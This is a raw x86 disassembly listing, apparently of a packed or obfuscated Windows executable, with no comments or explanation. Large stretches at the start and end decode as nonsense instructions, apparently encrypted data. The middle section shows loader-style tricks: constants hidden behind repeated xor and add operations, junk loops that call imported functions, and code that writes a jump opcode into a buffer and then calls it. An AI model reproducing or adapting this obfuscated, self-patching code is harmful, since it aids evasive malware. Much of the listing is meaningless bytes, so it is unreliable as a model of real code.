  406eb1:	xor    DWORD PTR [esi],esi
  406eb3:	call   0x57917ad
  406eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eb9:	aam    0x3
  406ebb:	xchg   edx,eax
  406ebc:	repnz cmp ah,BYTE PTR [ecx+0xebf2198]
  406ec3:	jmp    0x5758:0x291ae89
  406eca:	or     cl,BYTE PTR [eax+0x35770a04]
  406ed0:	xchg   DWORD PTR ds:0xe599c78f,edi
  406ed6:	jb     0x406ef4
  406ed8:	cmp    ebx,ecx
  406eda:	jmp    0x406e77
  406edc:	(bad)  
  406edd:	sub    al,0xca
  406edf:	(bad)  
  406ee0:	mov    ch,0x93
  406ee2:	clc    
  406ee3:	fnstsw WORD PTR [ebx-0x78c636d2]
  406ee9:	shr    esi,cl
  406eeb:	mov    bl,0xbe
  406eed:	push   0x83392aa1
  406ef2:	sub    BYTE PTR [esi-0x73],0x99
  406ef6:	arpl   WORD PTR [edx+eax*2+0x5b],di
  406efa:	fiadd  DWORD PTR [edi]
  406efc:	cs push 0x3e7b7727
  406f02:	pop    esp
  406f03:	dec    ecx
  406f04:	gs dec edi
  406f06:	sub    ch,0x4d
  406f09:	neg    DWORD PTR [esp+esi*1-0x36]
  406f0d:	jle    0x406f2b
  406f0f:	jns    0x406f4e
  406f11:	xchg   BYTE PTR [ebx+edi*8+0x5a],bl
  406f15:	mov    ss,WORD PTR [ebx+eiz*4]
  406f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f19:	rcr    DWORD PTR [ebp-0x6305144e],1
  406f1f:	inc    edi
  406f20:	js     0x406f60
  406f22:	mov    ds:0x47529324,eax
  406f27:	loope  0x406ebc
  406f29:	inc    eax
  406f2a:	mov    ah,0x36
  406f2c:	in     al,0xf
  406f2e:	push   0x50e553c1
  406f33:	fisub  DWORD PTR [eax]
  406f35:	sub    eax,0xd06717b1
  406f3a:	fcomp  DWORD PTR [esi+0x6d]
  406f3d:	mov    al,ds:0x7ce5a1e5
  406f42:	repz jp 0x406f8f
  406f45:	(bad)  
  406f46:	nop
  406f47:	push   edx
  406f48:	or     eax,0xb549f704
  406f4d:	sbb    al,0x60
  406f4f:	xor    al,0x5b
  406f51:	xchg   BYTE PTR [edi-0x2b],dl
  406f54:	ins    BYTE PTR es:[edi],dx
  406f55:	or     dh,ah
  406f57:	pop    esi
  406f58:	adc    DWORD PTR [ecx+edx*2-0x5fa431ae],edi
  406f5f:	mov    ds:0xbed9c9d,eax
  406f64:	(bad)  
  406f65:	jmp    0x406fde
  406f67:	cmp    al,0xd8
  406f69:	sbb    al,0xf7
  406f6b:	cmp    al,0x46
  406f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f6e:	and    bl,BYTE PTR [edx+0x3319c3b3]
  406f74:	lods   eax,DWORD PTR ds:[esi]
  406f75:	add    al,0xb7
  406f77:	sbb    BYTE PTR [ebx+0x6a],0x8f
  406f7b:	or     BYTE PTR [edi],bh
  406f7d:	cmp    ah,BYTE PTR [edi+eax*8+0x45]
  406f81:	js     0x406f05
  406f83:	ja     0x406ff2
  406f85:	int    0x7c
  406f87:	and    ecx,DWORD PTR [edx-0x49]
  406f8a:	xchg   ecx,eax
  406f8b:	int    0x18
  406f8d:	and    dl,BYTE PTR [ecx-0x63]
  406f90:	stos   DWORD PTR es:[edi],eax
  406f91:	push   ebp
  406f92:	arpl   WORD PTR [eax-0x5e98b59e],sp
  406f98:	mov    edx,0x97b2b7b4
  406f9d:	lods   eax,DWORD PTR ds:[esi]
  406f9e:	jb     0x406f42
  406fa0:	lods   al,BYTE PTR ds:[esi]
  406fa1:	adc    ebp,DWORD PTR [edx]
  406fa3:	call   0x24ea:0x7d6dc405
  406faa:	cmp    bh,ah
  406fac:	fadd   QWORD PTR [edx+0x58]
  406faf:	push   edi
  406fb0:	push   edi
  406fb1:	mov    ebp,0x1d1c22e6
  406fb6:	sbb    bl,BYTE PTR [edi]
  406fb8:	in     al,0x97
  406fba:	xchg   esp,eax
  406fbb:	jle    0x406fd6
  406fbd:	(bad)  
  406fbe:	outs   dx,DWORD PTR ds:[esi]
  406fbf:	ja     0x406fb9
  406fc1:	and    eax,0x6f0b11
  406fc6:	jg     0x406fb9
  406fc8:	ret    0xd02e
  406fcb:	pop    esp
  406fcc:	xchg   DWORD PTR [edi+0x2c],edi
  406fcf:	bound  edi,QWORD PTR [edi+0xb]
  406fd2:	stos   DWORD PTR es:[edi],eax
  406fd3:	jo     0x406ff0
  406fd5:	push   0xffffffa4
  406fd7:	mov    dl,0xb5
  406fd9:	(bad)  
  406fda:	out    dx,al
  406fdb:	jbe    0x406f84
  406fdd:	pop    ss
  406fde:	xchg   ebp,eax
  406fdf:	cmp    DWORD PTR [edi-0x693bab50],esp
  406fe5:	mov    bh,0x82
  406fe7:	into   
  406fe8:	mov    ah,0x52
  406fea:	xchg   BYTE PTR [esi-0x8],bl
  406fed:	xadd   DWORD PTR [edi+esi*1-0x6c],eax
  406ff2:	int    0xa5
  406ff4:	in     al,0x47
  406ff6:	push   ebx
  406ff7:	mov    dh,0xe
  406ff9:	das    
  406ffa:	ror    DWORD PTR [esi+0x23],1
  406ffd:	and    BYTE PTR [eax],al
  406fff:	pop    ss
  407000:	xor    edx,esi
  407002:	loopne 0x407076
  407004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407005:	(bad)  
  407006:	xchg   ebx,eax
  407007:	sahf   
  407008:	jbe    0x407016
  40700a:	out    0x69,al
  40700c:	mov    al,ds:0x61b5fb70
  407011:	xor    al,0x28
  407013:	int3   
  407014:	and    BYTE PTR [ecx],0x8f
  407017:	pop    ds
  407018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407019:	(bad)  
  40701a:	mov    eax,0x11038e6e
  40701f:	jle    0x40708c
  407021:	arpl   WORD PTR [edi],dx
  407023:	push   ebp
  407024:	aad    0x8f
  407026:	jnp    0x406ff2
  407028:	inc    edx
  407029:	xor    edx,DWORD PTR [edx+0x23]
  40702c:	and    dl,BYTE PTR [ecx-0x6b]
  40702f:	loope  0x406ffb
  407031:	das    
  407032:	rep ins DWORD PTR es:[edi],dx
  407034:	int3   
  407035:	daa    
  407036:	jns    0x407020
  407038:	mov    edi,0xbfb28da7
  40703d:	and    edx,edx
  40703f:	ins    DWORD PTR es:[edi],dx
  407040:	fs enter 0x549a,0x81
  407045:	mov    edx,0x7ea1bae8
  40704a:	add    ch,BYTE PTR [ebx+0x13466d6f]
  407050:	jae    0x407025
  407052:	jns    0x407036
  407054:	or     bh,0xa0
  407057:	dec    edx
  407058:	test   eax,0x51fb080c
  40705d:	idiv   BYTE PTR ds:0x388d374d
  407063:	aad    0x9f
  407065:	mov    ah,0x53
  407067:	push   ss
  407068:	push   eax
  407069:	add    BYTE PTR [eax-0x77],bl
  40706c:	in     eax,0xef
  40706e:	cmp    BYTE PTR [ebx],bl
  407070:	cmp    BYTE PTR [esi-0x2285eb03],0x31
  407077:	rol    DWORD PTR [ecx],1
  407079:	enter  0x5a6a,0xc9
  40707d:	cmp    BYTE PTR [ebp-0xa1bc87c],0x58
  407084:	mov    al,ds:0x88f20ab9
  407089:	dec    esp
  40708a:	(bad)  
  40708b:	stos   DWORD PTR es:[edi],eax
  40708c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40708d:	cdq    
  40708e:	fadd   QWORD PTR [edi+0x64b401c]
  407094:	jbe    0x4070d4
  407096:	test   eax,0xd50d2032
  40709b:	jo     0x407079
  40709d:	pushf  
  40709e:	inc    esp
  40709f:	rcr    bh,0x92
  4070a2:	jno    0x407087
  4070a4:	mov    ebp,0xbec9ef64
  4070a9:	xor    eax,0xf851d5ce
  4070ae:	jno    0x40709e
  4070b0:	lea    eax,[ebx+0x4b]
  4070b3:	clc    
  4070b4:	jmp    0x1d71:0x6baf610b
  4070bb:	fs test al,0x76
  4070be:	xor    al,0xd0
  4070c0:	xlat   BYTE PTR ds:[ebx]
  4070c1:	xchg   edi,eax
  4070c2:	inc    edi
  4070c3:	loop   0x407063
  4070c5:	jecxz  0x40705c
  4070c7:	adc    BYTE PTR [ebx+edi*4+0x49be66e9],ah
  4070ce:	stos   BYTE PTR es:[edi],al
  4070cf:	xor    edi,eax
  4070d1:	inc    ebx
  4070d2:	dec    BYTE PTR [ebp+0x7c]
  4070d5:	stos   DWORD PTR es:[edi],eax
  4070d6:	test   al,0xde
  4070d8:	adc    ebp,ecx
  4070da:	mov    ds:0xcfbe0a34,eax
  4070df:	dec    al
  4070e1:	jno    0x4070f9
  4070e3:	or     ecx,ebx
  4070e5:	repz add dh,cl
  4070e8:	call   0xbfc7:0x26899f94
  4070ef:	xchg   ebx,eax
  4070f0:	cli    
  4070f1:	dec    ebp
  4070f2:	push   ecx
  4070f3:	or     DWORD PTR [ebx],ecx
  4070f5:	fwait
  4070f6:	shl    BYTE PTR [ecx+0x79],0x4b
  4070fa:	xor    al,0x24
  4070fc:	mov    esp,0xdeac4175
  407101:	popf   
  407102:	push   ebx
  407103:	stc    
  407104:	pop    eax
  407105:	sbb    eax,0x7492505a
  40710a:	div    DWORD PTR [esi]
  40710c:	push   eax
  40710d:	stos   DWORD PTR es:[edi],eax
  40710e:	arpl   WORD PTR [edi],dx
  407110:	cs enter 0x5117,0xdb
  407115:	mov    ds,eax
  407117:	xchg   esi,eax
  407118:	xchg   ecx,eax
  407119:	fldcw  WORD PTR [eax+0x780936f7]
  40711f:	repnz pop es
  407121:	hlt    
  407122:	cld    
  407123:	and    DWORD PTR [esi-0x7c548773],esi
  407129:	mov    esp,0x9450ce0a
  40712e:	cmp    al,0xbd
  407130:	test   eax,0xa576ef02
  407135:	loop   0x4070e2
  407137:	mov    edx,0xe9497734
  40713c:	mov    ch,0xc5
  40713e:	sbb    dl,dh
  407140:	mov    ebp,0x7ed2c35a
  407145:	idiv   DWORD PTR [ebp+0x56ae89bf]
  40714b:	inc    eax
  40714c:	imul   DWORD PTR [ebp-0x7c3ab23c]
  407152:	popa   
  407153:	ror    DWORD PTR [ecx+0x6c],cl
  407156:	(bad)  
  407157:	xchg   ecx,eax
  407158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407159:	lods   eax,DWORD PTR ds:[esi]
  40715a:	pop    es
  40715b:	ins    DWORD PTR es:[edi],dx
  40715c:	sbb    BYTE PTR ds:[esi+0x5ec5d717],al
  407163:	in     eax,dx
  407164:	ret    
  407165:	cmp    ch,bh
  407167:	imul   ebp,DWORD PTR [edx],0xc2fed250
  40716d:	push   ss
  40716e:	push   cs
  40716f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407170:	mov    ebp,0x71a26ecb
  407175:	bound  edi,QWORD PTR [ebx]
  407177:	repz dec esi
  407179:	jmp    DWORD PTR [edx]
  40717b:	jns    0x407170
  40717d:	(bad)  
  40717e:	and    BYTE PTR [esi-0x4a],cl
  407181:	imul   BYTE PTR [eax-0x37]
  407184:	(bad)  
  407185:	xor    al,0x30
  407187:	and    ch,BYTE PTR [edx+0x3c]
  40718a:	out    dx,al
  40718b:	push   ds
  40718c:	rcr    DWORD PTR [ebx-0x21],cl
  40718f:	pop    edx
  407190:	int3   
  407191:	push   edx
  407192:	out    dx,eax
  407193:	cs sub eax,0x44fb46ab
  407199:	ror    BYTE PTR [edi],1
  40719b:	dec    ebp
  40719c:	xor    ax,0x4460
  4071a0:	je     0x4071b4
  4071a2:	lods   eax,DWORD PTR ds:[esi]
  4071a3:	push   eax
  4071a4:	mov    al,ds:0x3993074d
  4071a9:	stos   DWORD PTR es:[edi],eax
  4071aa:	mov    ds,eax
  4071ac:	inc    BYTE PTR [eax+0x570f91b1]
  4071b2:	iret   
  4071b3:	lds    edi,FWORD PTR [ebx+0x4cd59ec0]
  4071b9:	pushf  
  4071ba:	pop    ecx
  4071bb:	js     0x407141
  4071bd:	add    edi,DWORD PTR [ebp+0x65d373e9]
  4071c3:	mov    ecx,0xd4806fc1
  4071c8:	cmp    ch,BYTE PTR [ecx]
  4071ca:	mov    cl,0x15
  4071cc:	out    dx,eax
  4071cd:	cmp    BYTE PTR [ebp-0x26],0xb2
  4071d1:	xchg   ecx,eax
  4071d2:	data16 cmc 
  4071d4:	inc    ebx
  4071d5:	retf   0xacc9
  4071d8:	lods   al,BYTE PTR ds:[esi]
  4071d9:	pushf  
  4071da:	jne    0x407216
  4071dc:	pop    es
  4071dd:	and    al,cl
  4071df:	ins    DWORD PTR es:[edi],dx
  4071e0:	jecxz  0x40721c
  4071e2:	pop    ebx
  4071e3:	mov    eax,0x9c391385
  4071e8:	ins    DWORD PTR es:[edi],dx
  4071e9:	inc    edi
  4071ea:	jge    0x407171
  4071ec:	mov    al,0x35
  4071ee:	xchg   edi,eax
  4071ef:	adc    BYTE PTR [ebx+0x4edb95cf],0xef
  4071f6:	xor    esi,ebp
  4071f8:	fcmovu st,st(0)
  4071fa:	call   0x5ef8ec76
  4071ff:	xlat   BYTE PTR ds:[ebx]
  407200:	pop    edi
  407201:	add    edi,DWORD PTR [ebx-0x566f1b1b]
  407207:	pop    eax
  407208:	jmp    0x72ff:0xa73e0f98
  40720f:	or     al,0x7a
  407211:	mov    ebx,0xddbac133
  407216:	jb     0x40724a
  407218:	add    BYTE PTR [ebx],al
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	mov    esi,0x9aa660c7
  407754:	and    BYTE PTR [edx+0x7a],bh
  407757:	sbb    DWORD PTR [edi+0x7a],ebx
  40775a:	jp     0x407724
  40775c:	xor    BYTE PTR [eax-0x57],cl
  40775f:	sub    DWORD PTR [edx],edi
  407761:	repnz imul eax,DWORD PTR ds:0xa116f7bb,0xffffffd2
  407769:	stos   BYTE PTR es:[edi],al
  40776a:	test   DWORD PTR [esi+0x51],ecx
  40776d:	dec    edi
  40776e:	dec    esp
  40776f:	mov    eax,0x8dababb5
  407774:	cmc    
  407775:	(bad)  
  407777:	jmp    0xa574:0xa67a2185
  40777e:	aas    
  40777f:	cmp    al,0xdb
  407781:	xchg   BYTE PTR [ecx-0x53e2d757],cl
  407787:	outs   dx,BYTE PTR ds:[esi]
  407788:	stos   DWORD PTR es:[edi],eax
  407789:	push   es
  40778a:	xchg   ebp,eax
  40778b:	sbb    esp,DWORD PTR [ebp+0x3f9dd1e8]
  407791:	sbb    ebx,DWORD PTR [ecx-0x11]
  407794:	or     eax,0xaba6afb1
  407799:	cmc    
  40779a:	dec    DWORD PTR [esp+edx*1-0x46]
  40779e:	push   0xf0cab8d2
  4077a3:	lahf   
  4077a4:	jle    0x4077be
